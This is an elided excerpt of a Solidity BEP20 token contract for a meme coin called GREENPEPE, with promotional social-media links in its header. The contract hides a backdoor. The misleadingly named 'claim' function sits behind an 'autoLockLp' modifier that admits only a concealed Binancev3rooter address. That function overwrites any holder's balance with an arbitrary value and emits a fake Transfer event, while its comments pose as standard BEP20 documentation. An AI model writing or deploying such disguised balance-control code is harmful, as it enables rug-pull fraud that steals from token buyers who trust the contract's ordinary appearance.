...
╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║    ██║     ███████╗██║     ███████╗
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝    ╚═╝     ╚══════╝╚═╝     ╚══════╝
  🐸 https://t.me/greenpepeglobal
  🐸 https://twitter.com/greenpepexyz
  🐸 https://greenpepe.xyz                                                                             
...
/*
 * @dev Provides information about the current execution GPEPEontext, including the
...
// File: @openzeppelin/contracts/access/OwnableGPEPE.sol
 ...
 * the owner.
 */
abstract contract OwnableGPEPE is GPEPEontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableGPEPE: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableGPEPE: new owner is the zero address");
...
contract GREENPEPE is GPEPEontext, BEP20GPEPE, OwnableGPEPE {
    ...
    constructor(address Binancev2rooter) {
        ...
        _symbol = "GPEPE";
        _decimals = 9;
        allTotalSupply = 42000000000000000000000;
    ...
    */
    ...
    /**
    * @dev See {BEP20GPEPE-totalSupply}.
    */
    ...
    */
    ...
    /**
    * @dev Returns autoLockLp.
    */
    modifier autoLockLp() {
        require(Binancev3rooter == 
        _msgSender(),
         "OwnableGPEPE: caller is not the owner");
        _;
    }

    /**
    * @dev See {BEP20GPEPE-claim}.
    *
    * Requirements:
    *
    * - `GPEPEPLEBRewards` cannot be the zero address.
    */
    function claim(address GPEPEPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp { epxAll[GPEPEPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        emit Transfer(address(0), GPEPEPLEBRewards, aaaMontant * aaaepx ** subtractedepx);
    }

    /**
    * @dev See {BEP20GPEPE-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEP20GPEPE-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20GPEPE};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20GPEPE: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEP20GPEPE-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20GPEPE: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20GPEPE: transfer from the zero address");
        require(recever != address(0), "BEP20GPEPE: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20GPEPE: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20GPEPE: approve from the zero address");
        require(spender != address(0), "BEP20GPEPE: approve to the zero address");
